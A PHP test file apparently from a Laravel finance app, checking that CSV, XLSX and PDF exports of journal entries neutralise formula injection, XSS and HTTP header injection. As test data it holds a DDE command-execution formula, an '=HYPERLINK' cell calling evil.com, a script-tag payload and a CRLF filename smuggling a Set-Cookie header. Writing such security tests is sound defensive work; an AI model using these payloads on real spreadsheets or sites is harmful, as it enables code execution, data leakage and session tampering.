<?php

namespace Tests\Feature;

use App\Domain\Finance\Export\FinancialExportNormalizer;
use App\Domain\Tenant\TenantManager;
use App\Models\Account;
use App\Models\JournalEntry;
use App\Models\Outlet;
use App\Models\User;
use App\Services\Finance\Export\FinancialExportResult;
use App\Services\Finance\Export\FinancialExportService;
use App\Services\Finance\FinanceService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TenantTestCase;
use ZipArchive;

class FinancialExportSecurityTest extends TenantTestCase
{
    use RefreshDatabase;

    protected array $tenantData;

    protected User $owner;

    protected Outlet $outlet;

    protected FinanceService $financeService;

    protected FinancialExportService $exportService;

    protected function setUp(): void
    {
        parent::setUp();

        $this->tenantData = $this->createTenant('Warung Kopi Keamanan');
        $tenant = $this->tenantData['tenant'];
        $this->outlet = $this->tenantData['outlet'];
        $this->owner = $this->tenantData['owner'];

        $this->financeService = app(FinanceService::class);
        $this->exportService = app(FinancialExportService::class);

        $this->runForTenant(function () use ($tenant) {
            $this->financeService->ensureDefaultAccounts($tenant->id);
        });
    }

    protected function runForTenant(callable $callback): mixed
    {
        return app(TenantManager::class)->runForTenant($this->tenantData['tenant'], $callback);
    }

    public function test_csv_sanitizes_untrusted_text_starting_with_formula_characters(): void
    {
        $tenant = $this->tenantData['tenant'];

        $this->runForTenant(function () use ($tenant) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            // Seed entries with formula prefixes: =, +, -, @
            $payloads = [
                '=cmd|\' /C calc\'!A0',
                '+1+1',
                '-calc_run',
                '@SUM(1+1)*cmd',
            ];

            foreach ($payloads as $i => $payload) {
                $this->financeService->postJournal($tenant->id, [
                    'outlet_id' => $this->outlet->id,
                    'entry_date' => '2026-10-01',
                    'source_type' => JournalEntry::SOURCE_MANUAL,
                    'description' => $payload,
                ], [
                    ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 10000, 'credit_minor' => 0],
                    ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 10000],
                ]);
            }
        });

        $this->actingAs($this->owner);
        $response = $this->get('/api/v1/finance/journal-entries/export?format=csv');
        $response->assertStatus(200);

        $csv = $response->getContent();

        // Every formula-starting text MUST be prefixed with a single quote (')
        $this->assertStringContainsString("'=cmd|' /C calc'!A0", $csv);
        $this->assertStringContainsString("'+1+1", $csv);
        $this->assertStringContainsString("'-calc_run", $csv);
        $this->assertStringContainsString("'@SUM(1+1)*cmd", $csv);

        // Bare unescaped formula cells must not exist
        $this->assertStringNotContainsString(',=cmd|', $csv);
        $this->assertStringNotContainsString(',+1+1,', $csv);
        $this->assertStringNotContainsString(',-calc_run,', $csv);
        $this->assertStringNotContainsString(',@SUM(1+1)*cmd,', $csv);
    }

    public function test_csv_sanitizes_input_with_whitespace_and_control_characters_before_formula(): void
    {
        $tenant = $this->tenantData['tenant'];

        $this->runForTenant(function () use ($tenant) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            $payloads = [
                "\t=1+1",
                '   =SUM(A1:A5)',
                "\r-cmd_payload",
                "\n@eval_function",
                " \t +2+2",
            ];

            foreach ($payloads as $payload) {
                $this->financeService->postJournal($tenant->id, [
                    'outlet_id' => $this->outlet->id,
                    'entry_date' => '2026-10-01',
                    'source_type' => JournalEntry::SOURCE_MANUAL,
                    'description' => $payload,
                ], [
                    ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 5000, 'credit_minor' => 0],
                    ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 5000],
                ]);
            }
        });

        $this->actingAs($this->owner);
        $response = $this->get('/api/v1/finance/journal-entries/export?format=csv');
        $response->assertStatus(200);

        $csv = $response->getContent();

        $this->assertStringContainsString("'\t=1+1", $csv);
        $this->assertStringContainsString("'   =SUM(A1:A5)", $csv);
        $this->assertStringContainsString("'\r-cmd_payload", $csv);
        $this->assertStringContainsString("'\n@eval_function", $csv);
        $this->assertStringContainsString("' \t +2+2", $csv);
    }

    public function test_csv_sanitizes_unicode_full_width_formula_characters(): void
    {
        $tenant = $this->tenantData['tenant'];

        $this->runForTenant(function () use ($tenant) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            // Full-width Unicode formula prefixes: ＝ (U+FF1D), ＋ (U+FF0B), － (U+FF0D), ＠ (U+FF20)
            $payloads = [
                '＝1+1',
                '＋SUM(1,2)',
                '－calc_payload',
                '＠eval_code',
                '  ＝cmd',
                "\t＋2",
                "\r－test",
                "\n＠alert",
            ];

            foreach ($payloads as $payload) {
                $this->financeService->postJournal($tenant->id, [
                    'outlet_id' => $this->outlet->id,
                    'entry_date' => '2026-10-01',
                    'source_type' => JournalEntry::SOURCE_MANUAL,
                    'description' => $payload,
                ], [
                    ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 7500, 'credit_minor' => 0],
                    ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 7500],
                ]);
            }
        });

        $this->actingAs($this->owner);
        $response = $this->get('/api/v1/finance/journal-entries/export?format=csv');
        $response->assertStatus(200);

        $csv = $response->getContent();

        // Full-width Unicode formula triggers MUST be prefixed with single quote (')
        $this->assertStringContainsString("'＝1+1", $csv);
        $this->assertStringContainsString("'＋SUM(1,2)", $csv);
        $this->assertStringContainsString("'－calc_payload", $csv);
        $this->assertStringContainsString("'＠eval_code", $csv);
        $this->assertStringContainsString("'  ＝cmd", $csv);
        $this->assertStringContainsString("'\t＋2", $csv);
        $this->assertStringContainsString("'\r－test", $csv);
        $this->assertStringContainsString("'\n＠alert", $csv);

        // Bare unescaped full-width formula triggers must not exist
        $this->assertStringNotContainsString(',＝1+1,', $csv);
        $this->assertStringNotContainsString(',＋SUM(1,2),', $csv);
        $this->assertStringNotContainsString(',－calc_payload,', $csv);
        $this->assertStringNotContainsString(',＠eval_code,', $csv);
    }

    public function test_csv_cell_boundary_safety_and_column_count_consistency(): void
    {
        $tenant = $this->tenantData['tenant'];

        $this->runForTenant(function () use ($tenant) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            $complexDescriptions = [
                'Deskripsi dengan, koma, dan "tanda kutip"',
                "Deskripsi multi-baris\nBaris 2\nBaris 3 dengan, koma",
                '=cmd, with comma and "quotes"',
                '＝SUM(A1, B1), full-width formula with comma',
                'Keterangan normal; dengan titik koma',
            ];

            foreach ($complexDescriptions as $desc) {
                $this->financeService->postJournal($tenant->id, [
                    'outlet_id' => $this->outlet->id,
                    'entry_date' => '2026-10-01',
                    'source_type' => JournalEntry::SOURCE_MANUAL,
                    'description' => $desc,
                ], [
                    ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 12000, 'credit_minor' => 0],
                    ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 12000],
                ]);
            }
        });

        $this->actingAs($this->owner);
        $response = $this->get('/api/v1/finance/journal-entries/export?format=csv');
        $response->assertStatus(200);

        $csv = $response->getContent();

        // Parse CSV stream using standard RFC 4180 parser to verify cell boundary integrity
        $stream = fopen('php://memory', 'r+');
        fwrite($stream, $csv);
        rewind($stream);

        $inJournalSection = false;
        $expectedColumnCount = null;
        $dataRowCount = 0;

        while (($row = fgetcsv($stream)) !== false) {
            if (empty($row) || (count($row) === 1 && empty($row[0]))) {
                continue;
            }

            if ($row[0] === '[Daftar Transaksi Jurnal Umum]') {
                $inJournalSection = true;
                // Next row will be header row
                $headerRow = fgetcsv($stream);
                $this->assertNotEmpty($headerRow);
                $expectedColumnCount = count($headerRow);
                $this->assertEquals(12, $expectedColumnCount, 'Journal table header must have exactly 12 columns.');

                continue;
            }

            if ($inJournalSection) {
                if (str_starts_with((string) $row[0], '===')) {
                    // Next sheet
                    break;
                }

                // Every data row and totals row MUST have exactly 12 columns
                $this->assertCount(
                    $expectedColumnCount,
                    $row,
                    "CSV Row must maintain strict {$expectedColumnCount} column boundary count without splitting."
                );

                if ($row[0] === 'TOTAL') {
                    // Reached totals row
                    break;
                }

                $dataRowCount++;
            }
        }

        fclose($stream);

        $this->assertGreaterThanOrEqual(5, $dataRowCount, 'All seeded complex rows must be parsed intact.');
    }

    public function test_csv_preserves_rfc_4180_escaping_for_commas_quotes_and_newlines(): void
    {
        $tenant = $this->tenantData['tenant'];

        $this->runForTenant(function () use ($tenant) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            $this->financeService->postJournal($tenant->id, [
                'outlet_id' => $this->outlet->id,
                'entry_date' => '2026-10-01',
                'source_type' => JournalEntry::SOURCE_MANUAL,
                'description' => "Penjualan Kopi \"Luwak\", Manis & Gurih\nCatatan: Baris Kedua",
            ], [
                ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 25000, 'credit_minor' => 0],
                ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 25000],
            ]);

            // Formula payload containing comma and quotes
            $this->financeService->postJournal($tenant->id, [
                'outlet_id' => $this->outlet->id,
                'entry_date' => '2026-10-01',
                'source_type' => JournalEntry::SOURCE_MANUAL,
                'description' => '=cmd, with "quotes" and , commas',
            ], [
                ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 30000, 'credit_minor' => 0],
                ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 30000],
            ]);
        });

        $this->actingAs($this->owner);
        $response = $this->get('/api/v1/finance/journal-entries/export?format=csv');
        $response->assertStatus(200);

        $csv = $response->getContent();

        // RFC 4180 requires doubled quotes inside quotes
        $this->assertStringContainsString('"Penjualan Kopi ""Luwak"", Manis & Gurih'."\n".'Catatan: Baris Kedua"', $csv);
        // Formula with quotes must be both quote-prefixed for safety and RFC 4180 quoted
        $this->assertStringContainsString('"\'=cmd, with ""quotes"" and , commas"', $csv);
    }

    public function test_valid_negative_money_values_and_numbers_are_not_corrupted(): void
    {
        $tenant = $this->tenantData['tenant'];

        $this->runForTenant(function () use ($tenant) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            // Revenue 5.000.000
            $this->financeService->postJournal($tenant->id, [
                'outlet_id' => $this->outlet->id,
                'entry_date' => '2026-10-01',
                'source_type' => JournalEntry::SOURCE_SALE,
                'description' => 'Penjualan Normal',
            ], [
                ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 5000000, 'credit_minor' => 0],
                ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 5000000],
            ]);

            // Sales Return 1.500.000
            $this->financeService->postJournal($tenant->id, [
                'outlet_id' => $this->outlet->id,
                'entry_date' => '2026-10-02',
                'source_type' => JournalEntry::SOURCE_REFUND,
                'description' => 'Retur Pelanggan',
            ], [
                ['account_id' => $accounts[Account::CODE_SALES_RETURN]->id, 'debit_minor' => 1500000, 'credit_minor' => 0],
                ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 0, 'credit_minor' => 1500000],
            ]);
        });

        $this->actingAs($this->owner);
        $response = $this->get('/api/v1/finance/profit-loss/export?format=csv&period=this_month');
        $response->assertStatus(200);

        $csv = $response->getContent();

        // Exact negative integer must NOT be converted to string or single-quoted
        $this->assertStringContainsString('"Retur Penjualan (Sales Return)",-1500000', $csv);
        $this->assertStringNotContainsString("'-1500000", $csv);

        // Exact negative formatted rupiah must NOT be single-quoted
        $this->assertStringContainsString('-Rp 1.500.000', $csv);
        $this->assertStringNotContainsString("'-Rp 1.500.000", $csv);

        // Net revenue calculation
        $this->assertStringContainsString('"Pendapatan Bersih (Net Revenue)",3500000', $csv);
    }

    public function test_text_normalization_does_not_mutate_source_models_or_database_state(): void
    {
        $tenant = $this->tenantData['tenant'];
        $dangerousDescription = '=cmd|\' /C calc\'!A0';

        $entry = $this->runForTenant(function () use ($tenant, $dangerousDescription) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            return $this->financeService->postJournal($tenant->id, [
                'outlet_id' => $this->outlet->id,
                'entry_date' => '2026-10-01',
                'source_type' => JournalEntry::SOURCE_MANUAL,
                'description' => $dangerousDescription,
            ], [
                ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 10000, 'credit_minor' => 0],
                ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 10000],
            ]);
        });

        $this->actingAs($this->owner);

        // Perform all export formats
        $this->get('/api/v1/finance/journal-entries/export?format=csv')->assertStatus(200);
        $this->get('/api/v1/finance/journal-entries/export?format=xlsx')->assertStatus(200);
        $this->get('/api/v1/finance/journal-entries/export?format=pdf')->assertStatus(200);

        // Reload entry fresh from database within tenant context
        $refreshedEntry = $this->runForTenant(function () use ($entry) {
            return $entry->fresh();
        });

        $this->assertEquals(
            $dangerousDescription,
            $refreshedEntry->description,
            'Database record must remain unmutated; sanitization applies strictly to export representations.'
        );
    }

    public function test_exported_financial_values_remain_strictly_consistent_with_canonical_report(): void
    {
        $tenant = $this->tenantData['tenant'];

        $this->runForTenant(function () use ($tenant) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            $this->financeService->postJournal($tenant->id, [
                'outlet_id' => $this->outlet->id,
                'entry_date' => '2026-10-01',
                'source_type' => JournalEntry::SOURCE_SALE,
                'description' => 'Penjualan Standar',
            ], [
                ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 8000000, 'credit_minor' => 0],
                ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 8000000],
            ]);

            $this->financeService->postJournal($tenant->id, [
                'outlet_id' => $this->outlet->id,
                'entry_date' => '2026-10-01',
                'source_type' => JournalEntry::SOURCE_SALE,
                'description' => 'HPP Standar',
            ], [
                ['account_id' => $accounts[Account::CODE_COGS]->id, 'debit_minor' => 3200000, 'credit_minor' => 0],
                ['account_id' => $accounts[Account::CODE_INVENTORY]->id, 'debit_minor' => 0, 'credit_minor' => 3200000],
            ]);
        });

        $this->actingAs($this->owner);

        $jsonRes = $this->getJson('/api/v1/finance/profit-loss?period=this_month');
        $jsonRes->assertStatus(200);
        $data = $jsonRes->json('data');

        $rev = (int) $data['revenue_minor'];
        $cogs = (int) $data['cogs_minor'];
        $gross = (int) $data['gross_profit_minor'];

        $csvRes = $this->get('/api/v1/finance/profit-loss/export?format=csv&period=this_month');
        $csvRes->assertStatus(200);
        $csv = $csvRes->getContent();

        $this->assertStringContainsString("\"Pendapatan Bersih (Net Revenue)\",{$rev}", $csv);
        $this->assertStringContainsString("\"Beban Pokok Penjualan (COGS / HPP)\",{$cogs}", $csv);
        $this->assertStringContainsString("\"Laba Kotor (Gross Profit)\",{$gross}", $csv);
    }

    public function test_xlsx_writes_untrusted_text_as_string_cells_and_not_executable_formulas(): void
    {
        $tenant = $this->tenantData['tenant'];
        $formulaPayload = '=HYPERLINK("http://evil.com/leak")';

        $this->runForTenant(function () use ($tenant, $formulaPayload) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            $this->financeService->postJournal($tenant->id, [
                'outlet_id' => $this->outlet->id,
                'entry_date' => '2026-10-01',
                'source_type' => JournalEntry::SOURCE_MANUAL,
                'description' => $formulaPayload,
            ], [
                ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 10000, 'credit_minor' => 0],
                ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 10000],
            ]);
        });

        $this->actingAs($this->owner);
        $response = $this->get('/api/v1/finance/journal-entries/export?format=xlsx');
        $response->assertStatus(200);

        $xlsxContent = $response->getContent();
        $this->assertNotEmpty($xlsxContent);

        // Inspect XLSX OOXML internal structure
        $tempPath = tempnam(sys_get_temp_dir(), 'test_xlsx_').'.xlsx';
        file_put_contents($tempPath, $xlsxContent);

        $zip = new ZipArchive;
        $this->assertTrue($zip->open($tempPath));

        $sheetXml = $zip->getFromName('xl/worksheets/sheet1.xml');
        $this->assertNotEmpty($sheetXml);

        // Crucial security assertion: NO executable <f> formula tag must be generated for the untrusted text
        $this->assertStringNotContainsString('<f>=HYPERLINK', $sheetXml);
        $this->assertStringNotContainsString('<f>', $sheetXml, 'Worksheet must not contain executable formula tags.');

        // Untrusted text must be stored as literal text in <t>
        $this->assertStringContainsString('=HYPERLINK(&quot;http://evil.com/leak&quot;)', $sheetXml);

        // Numeric values must be numeric cells (<v>10000</v>)
        $this->assertStringContainsString('<v>10000</v>', $sheetXml);

        $zip->close();
        @unlink($tempPath);
    }

    public function test_pdf_escapes_dynamic_content_and_script_tags(): void
    {
        $tenant = $this->tenantData['tenant'];
        $xssPayload = '<script>alert("xss")</script><b id="pwn">Test Tag</b>';

        $this->runForTenant(function () use ($tenant, $xssPayload) {
            $accounts = $this->financeService->ensureDefaultAccounts($tenant->id);

            $this->financeService->postJournal($tenant->id, [
                'outlet_id' => $this->outlet->id,
                'entry_date' => '2026-10-01',
                'source_type' => JournalEntry::SOURCE_MANUAL,
                'description' => $xssPayload,
            ], [
                ['account_id' => $accounts[Account::CODE_CASH]->id, 'debit_minor' => 10000, 'credit_minor' => 0],
                ['account_id' => $accounts[Account::CODE_SALES_REVENUE]->id, 'debit_minor' => 0, 'credit_minor' => 10000],
            ]);
        });

        $this->actingAs($this->owner);
        $response = $this->get('/api/v1/finance/journal-entries/export?format=pdf');
        $response->assertStatus(200);

        $this->assertStringStartsWith('%PDF', $response->getContent());
        $this->assertStringContainsString('.pdf', (string) $response->headers->get('Content-Disposition'));

        // Render blade view directly within tenant context to confirm HTML escaping
        $renderedHtml = $this->runForTenant(function () use ($tenant) {
            $entries = JournalEntry::with(['lines.account', 'outlet'])->where('tenant_id', $tenant->id)->get();

            return view('finance.reports.pdf-template', [
                'exportData' => FinancialExportNormalizer::normalizeJournalEntries(
                    entries: $entries,
                    tenantName: 'Warung <Test>',
                    outletName: 'Outlet <Test>',
                    periodText: 'Semua Riwayat',
                    generatedAt: '2026-10-09'
                ),
            ])->render();
        });

        // Blade MUST HTML-escape dynamic contents:
        $this->assertStringNotContainsString('<script>alert("xss")</script>', $renderedHtml);
        $this->assertStringContainsString('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;', $renderedHtml);
        $this->assertStringNotContainsString('<b id="pwn">', $renderedHtml);
        $this->assertStringContainsString('&lt;b id=&quot;pwn&quot;&gt;', $renderedHtml);
        $this->assertStringContainsString('Warung &lt;Test&gt;', $renderedHtml);
    }

    public function test_http_headers_and_filename_are_sanitized(): void
    {
        $maliciousFilename = "test\r\nSet-Cookie: evil=1\r\n..\\evil.csv";
        $result = new FinancialExportResult(
            content: 'data',
            filename: $maliciousFilename,
            contentType: 'text/csv; charset=UTF-8',
            format: 'csv'
        );

        $response = $result->toResponse();

        $contentDisposition = (string) $response->headers->get('Content-Disposition');

        // CRLF injection must not create a Set-Cookie header
        $this->assertFalse($response->headers->has('Set-Cookie'));
        // CRLF characters must not exist in Content-Disposition
        $this->assertStringNotContainsString("\r", $contentDisposition);
        $this->assertStringNotContainsString("\n", $contentDisposition);
        // Path traversal separators must not exist in filename
        $this->assertStringNotContainsString('..\\', $contentDisposition);
        $this->assertStringNotContainsString('../', $contentDisposition);
        $this->assertEquals('nosniff', $response->headers->get('X-Content-Type-Options'));
    }
}
